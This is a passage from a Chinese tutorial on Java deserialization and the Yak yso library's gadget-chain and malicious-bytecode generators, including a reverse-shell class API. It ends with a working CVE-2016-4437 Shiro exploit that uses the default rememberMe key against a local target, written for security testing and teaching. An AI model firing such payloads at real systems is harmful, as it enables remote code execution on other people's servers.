# 8.6 Java序列化协议支持

## 8.6.1  基础概念: Java反序列化

在Java中，序列化是将对象状态转换为字节流的过程，以便通过网络传输或存储到磁盘。相对地，反序列化则是将这些字节流还原回原始对象状态的过程。Java允许通过自定义`writeObject`和`readObject`方法来控制序列化和反序列化的细节。不过，在反序列化时，如果输入数据未经过严格验证，攻击者便有机会注入恶意数据。这些恶意数据在`readObject`方法处理时，可能会修改对象状态或控制执行流程，从而引入安全漏洞。

## 8.6.2 序列化对象流的组成

Java的序列化机制采用一种标准格式编码对象，包括`Magic Header`、版本、类描述和类成员等组件，能够递归处理整个对象图的自动序列化。

- Stream Magic：由两字节序列`AC ED`组成，标识序列化对象流的开始。
- Stream Version：紧随其后的两个字节（通常为`00 05`），标明序列化流的版本。
- Object Graph：从`TC_OBJECT`标记开始，标识接下来的数据代表一个对象，接着是类描述器，递归序列化对象和类的结构：
  - Class Descriptor：每个对象或类的描述信息，以`TC_CLASSDESC`开头，后跟类名、`SerialVersionUID`（类版本验证）等信息。
  - Class Data：对象中每个字段的值，按照类描述中的顺序排列。
- Block Data：针对`Externalizable`对象，包含`writeObject`/`readObject`方法写入的自定义数据。
- Type Codes：类型代码，如`TC_NULL`（空引用）、`TC_STRING`（字符串对象）、`TC_ARRAY`（数组对象）等，标识不同类型的数据或对象状态。

### 类描述：Class Descriptor

- **TC_CLASSDESC**: 类描述标记。
- **ClassName**: 类名字符串。
- **SerialVersionUID**: 类的 serialVersionUID，用于验证类版本。
- **Class Flags**: 类的标志，如是否支持 `Serializable`、`Externalizable` 等。
- **Field Count**: 类中字段的数量。
- **Fields**: 类字段的描述。
  - **FieldName**: 字段名。
  - **FieldType**: 字段类型。
- **Class Annotation**: 类注解，用于支持代理类和其他特性。
- **Super Class** **Descriptor**: 父类描述符，递归地序列化父类。

### 类型码：**Type Codes**

下表是按照类型码的功能和对应的字节值整理的信息：

| Type Code         | Byte Value (Hex) | Description                  |
| ----------------- | ---------------- | ---------------------------- |
| TC_OBJECT         | 0x73 ('s')       | 表示一个对象                 |
| TC_CLASS          | 0x76 ('v')       | 表示一个类对象               |
| TC_ARRAY          | 0x75 ('u')       | 表示一个数组对象             |
| TC_STRING         | 0x74 ('t')       | 表示一个字符串对象           |
| TC_LONGSTRING     | 0x7c ('          | ')                           |
| TC_ENUM           | 0x7e ('~')       | 表示一个枚举类型             |
| TC_CLASSDESC      | 0x72 ('r')       | 类描述标记                   |
| TC_PROXYCLASSDESC | 0x7d ('}')       | 代理类描述标记               |
| TC_EXCEPTION      | 0x7b ('{')       | 在序列化过程中发生的异常     |
| TC_RESET          | 0x79 ('y')       | 重置序列化流的回溯状态       |
| TC_REFERENCE      | 0x71 ('q')       | 表示对先前已序列化对象的引用 |
| TC_NULL           | 0x70 ('p')       | 表示一个空引用               |
| TC_BLOCKDATA      | 0x77 ('w')       | 表示对象的非透明块数据内容   |
| TC_BLOCKDATALONG  | 0x7a ('z')       | 表示长块数据                 |
| TC_ENDBLOCKDATA   | 0x78 ('x')       | 结束块数据的标记             |
| TC_UNKNOWN        | 0x00             | 未知类型码                   |

## 8.6.3 Yak 语言中对序列化数据流的操作

在Yak中，`yso`库被设计用来处理Java序列化和反序列化的任务。具体来说，可以分为几类函数，如解析、生成、输出。

### 解析序列化对象

yso库提供了`yso.GetJavaObjectFromBytes`函数，其参数是`[]byte`类型，可以将序列化的数据流转换成Java对象，这使得用户能够访问并修改该对象的内部状态。完成修改后，`yso.ToBytes` 函数可以被用来将这个已经修改的Java对象重新序列化成数据流，以此实现对序列化数据修改的效果。

### 生成序列化对象

Java反序列化漏洞的形成源于攻击者精心构造的恶意序列化数据流，这些数据在反序列化时能够操纵或影响该过程。这种漏洞的典型利用路径是实现远程代码执行，攻击者经常会创建能够在反序列化阶段通过反射调用任意方法的类，常见的攻击方式包括使用 `Runtime.exec` 方法执行命令。为了通过反射调用`Runtime.exec`方法，常用的几个序列化数据流被总结为几条常用gadget，Yak可以直接构造出这些序列化数据。yso库提供了如`yso.GetCommonsBeanutils183NOCCJavaObject`、`yso.GetCommonsCollections1JavaObject`的生成类函数，可以根据需求选择gadget生成payload，其参数为可选参数，可以设置内部恶意类、命令等信息，返回值为*yso.JavaObject类型和一个error信息。

```Go
gadgetObj = yso.GetCommonsBeanutils183NOCCJavaObject(yso.useRuntimeExecEvilClass("whoami"))~
gadgetBytes = yso.ToBytes(gadgetObj)~
```

### 输出序列化对象

yso库提供了yso.ToBytes函数，其参数为*yso.JavaObject类型，可以将序列化对象输出为字节流，除此之外还可以使用yso.ToJson输出为json。

```Go
gadgetObj = yso.GetCommonsBeanutils183NOCCJavaObject(yso.useRuntimeExecEvilClass("whoami"))~
gadgetBytes = yso.ToBytes(gadgetObj)~
```

### Yak生成利用链的序列化对象

| 功能名称                               | 描述                                                       |
| -------------------------------------- | ---------------------------------------------------------- |
| GetJavaObjectFromBytes                 | 从字节获取Java对象                                         |
| GetBeanShell1JavaObject                | 获取BeanShell利用链的Java对象                              |
| GetClick1JavaObject                    | 获取Click框架利用链的Java对象                              |
| GetCommonsBeanutils1JavaObject         | 获取Commons Beanutils利用链的Java对象（多个版本）          |
| GetCommonsCollections1JavaObject       | 获取Apache Commons Collections利用链的Java对象（多个版本） |
| GetGroovy1JavaObject                   | 获取Groovy利用链的Java对象                                 |
| GetJBossInterceptors1JavaObject        | 获取JBoss Interceptors利用链的Java对象                     |
| GetURLDNSJavaObject                    | 获取利用DNS查询的Java对象                                  |
| GetFindGadgetByDNSJavaObject           | 通过DNS查询寻找Gadget的Java对象                            |
| GetJSON1JavaObject                     | 获取JSON相关利用链的Java对象                               |
| GetJavassistWeld1JavaObject            | 获取Javassist Weld利用链的Java对象                         |
| GetJdk7u21JavaObject                   | 获取针对JDK 7u21版本的利用链Java对象                       |
| GetJdk8u20JavaObject                   | 获取针对JDK 8u20版本的利用链Java对象                       |
| GetAllGadget                           | 获取所有可用的利用链（Gadget）                             |
| GetAllTemplatesGadget                  | 获取所有模板相关的利用链                                   |
| GetAllRuntimeExecGadget                | 获取所有执行系统命令的利用链                               |
| GetGadgetNameByFun                     | 通过函数获取利用链名称                                     |
| GetSimplePrincipalCollectionJavaObject | 获取用于Shiro检查的Java对象                                |

以上是Yak生成利用链对象的常见API，用户可以使用 `yso.Get...`的方法使用这些 API。结合我们上述案例，用户可以很容易在编写代码的过程中，生成利用链对象测试Java应用的安全性。

## 8.6.4 Java字节码解析

在Java中，源代码在执行之前必须先被编译成字节码文件，这些文件以`.class`作为文件后缀。这些编译后的字节码文件随后被Java虚拟机（JVM）加载和执行。在反序列化攻击中，某些利用链允许执行代码，而这些代码必须以Java字节码的形式存在。因此，在构造恶意的序列化数据流时，需要能够插入或修改字节码。通过解析`.class`文件的结构，包括常量池和字节码指令集，可以根据其攻击目的进行相应的修改。完成这些修改后，再重新生成`.class`文件，用来构造序列化数据流。

### 字节码解析

在yaklang中可以使用`yso.LoadClassFromBytes`函数解析 java 字节码，如下代码将会读取/tmp/test.class文件，并解析为结构化对象

案例中的返回值classIns为ClassObject类型

```Go
type ClassObject struct {
    Type                 string
    Magic                number
    MinorVersion         number
    MajorVersion         number
    ConstantPool         []javaclassparser.ConstantInfo
    AccessFlags          number
    AccessFlagsVerbose   []string
    ThisClass            number
    ThisClassVerbose     string
    SuperClass           number
    SuperClassVerbose    string
    Interfaces           []number
    InterfacesVerbose    []string
    Fields               []javaclassparser.MemberInfo
    Methods              []javaclassparser.MemberInfo
    Attributes           []javaclassparser.AttributeInfo
}
func (ClassObject) Bcel() (string, error)
func (ClassObject) Bytes() []byte
func (ClassObject) Dump() (string, error)
func (ClassObject) FindConstStringFromPool(v string) *ConstantUtf8Info
func (ClassObject) FindFields() nil
func (ClassObject) FindMethods() nil
func (ClassObject) GetClassName() string
func (ClassObject) GetInterfacesName() []string
func (ClassObject) GetSupperClassName() string
func (ClassObject) Json() (string, error)
func (ClassObject) SetClassName(name string) error
func (ClassObject) SetMethodName(old string, name string) error
func (ClassObject) SetSourceFileName(name string) error
```

### 字节码修改

通过对结构体属性的修改或通过结构体方法可以配置类结构的信息，再调用Byte方法可以重新生成字节数组，实现对class文件的修改，在上面的案例中，我们将/tmp/test.class文件解析为了结构化对象。下面的案例将会修改类名、java版本，并生成新class文件

```Go
classIns.SetClassName("newTest")
classIns.MajorVersion = 50
file.Save("/tmp/newTest.class", classIns.Bytes())
```

### 字节码生成

上面的案例中将修改后的class对象输出为bytes类型，除此外，还可以输出为bcel class，用于payload构造，或json格式字节码，可以用来查看class内部结构或对class信息修改。例如：

```Go
buildPayload(classIns.Bcel()) // 构造payload
dump(classIns.Json()) // 查看class内部结构
```

### 生成序列化数据

得益于java字节码修改的基础设施，可以在构造序列化payload时对class进行配置，如下是使用Yak脚本来生成CB1的payload，其中对class设置了版本为`52`、执行命令为`whoami`、class名为`djRiEemN`

```Go
version = 52
command = "whoami"
className = "djRiEemN"
gadgetObj = yso.GetCommonsBeanutils1JavaObject(
  yso.useRuntimeExecEvilClass(command),
  yso.evilClassName(className),
  yso.majorVersion(version)
)~
gadgetBytes = yso.ToBytes(gadgetObj)~
```

### Yak生成恶意字节码 API

当然，除了上述这个案例之外，Yak语言还支持单独生成恶意类字节码，用户可以使用`yso.Generate...`相关的API 来生成恶意字节码。

| 功能名称                                         | 描述                                        |
| ------------------------------------------------ | ------------------------------------------- |
| GenerateClassObjectFromBytes                     | 从字节码生成恶意类对象                      |
| GenerateRuntimeExecEvilClassObject               | 生成执行系统命令的恶意类对象                |
| GenerateProcessBuilderExecEvilClassObject        | 通过ProcessBuilder执行系统命令的恶意类对象  |
| GenerateProcessImplExecEvilClassObject           | 生成使用ProcessImpl执行系统命令的恶意类对象 |
| GenerateDNSlogEvilClassObject                    | 生成用于DNS记录的恶意类对象                 |
| GenerateSpringEchoEvilClassObject                | 生成Spring框架回显的恶意类对象              |
| GenerateModifyTomcatMaxHeaderSizeEvilClassObject | 修改Tomcat最大头部大小的恶意类对象          |
| GenerateTcpReverseEvilClassObject                | 生成TCP反向连接的恶意类对象                 |
| GenerateTcpReverseShellEvilClassObject           | 生成TCP反向Shell的恶意类对象                |
| GenerateTomcatEchoClassObject                    | 生成Tomcat回显的恶意类对象                  |
| GenerateMultiEchoClassObject                     | 生成多重回显的恶意类对象                    |
| GenerateHeaderEchoClassObject                    | 生成头部回显的恶意类对象                    |
| GenerateSleepClassObject                         | 生成使目标休眠的恶意类对象                  |

## 8.6.5 测试案例：*CVE*-*2016-4437 Shiro 反序列化漏洞*

### *CVE*-*2016-4437 Shiro 反序列化漏洞*

Apache Shiro在处理用户会话时使用了Java的序列化机制。用户的会话信息被序列化后存储在cookie中，这个cookie通常叫做`rememberMe`。当用户下次访问应用时，应用会解析这个cookie，反序列化会话信息，以恢复用户的会话状态。漏洞产生的原因是Shiro在反序列化`rememberMe` cookie时没有充分检查输入数据的有效性。攻击者可以通过发送恶意的序列化对象来利用这个漏洞。如果应用程序的类路径中存在可以被触发恶意行为的类，攻击者可以执行任意代码。

### 编写利用脚本

先生成一个命令执行的payload：

```Go
version = 52
command = "whoami"
className = "guAVnGeu"
log.setLevel("info")
gadgetObj = yso.GetCommonsBeanutils1JavaObject(
  yso.useProcessBuilderExecEvilClass(command),
  yso.obfuscationClassConstantPool(),
  yso.evilClassName(className),
  yso.majorVersion(version)
)~
gadgetBytes = yso.ToBytes(gadgetObj)~
```

Shiro的Cookie默认使用默认key的cbc加密，所以需要再对payload加密，得到remberMe：

```Go
base64Key = "kPH+bIxk5D2deZiIxcaaaA==" // base64编码的key
key,_ = codec.DecodeBase64(base64Key) // 生成key
payload = codec.PKCS5Padding(gadgetBytes, 16) // 加密payload
encodePayload = codec.AESCBCEncrypt(key, payload, nil)~
rememberMe = codec.EncodeBase64(append(key, encodePayload...))
```

最后将payload发送至目标：

```Go
target = "127.0.0.1:8080"
rsp,req,_ = poc.HTTP(
  `GET /login HTTP/1.1
Host: {{params(target)}}
Cookie: rememberMe={{params(payload)}}
`,
  poc.params({
    "payload":rememberMe,
    "target":target,
  })
) // 发送payload
str.SplitHTTPHeadersAndBodyFromPacket(rsp)
log.info("发送Payload成功")
log.info("响应包: ",string(rsp))
```

## 8.6.6 在Yakit 使用Yso-Java Hack

### Gadget预览

对于初学者来说，Java反序列化部分知识点可能因为存在大量的Gadget相关信息而成为学习的障碍。Yso-Java Hack模块支持输出Gadget内部结构，让学习者能够清晰地看到Gadget的组成结构和实现原理。

![img](/yak-basic/cap8-5-1.png)

### 生成 Yaklang 代码

在编写序列化利用脚本时，可以通过Yso-Java Hack配置需要的Gadget、EvilClass等信息，自动生成 Yaklang 脚本

![img](/yak-basic/cap8-5-2.png)

### 生成序列化数据

在Yakit的Yso-Java Hack中可以通过UI配置对象信息，直接生成具有攻击性的序列化数据

![img](/yak-basic/cap8-5-3.png)
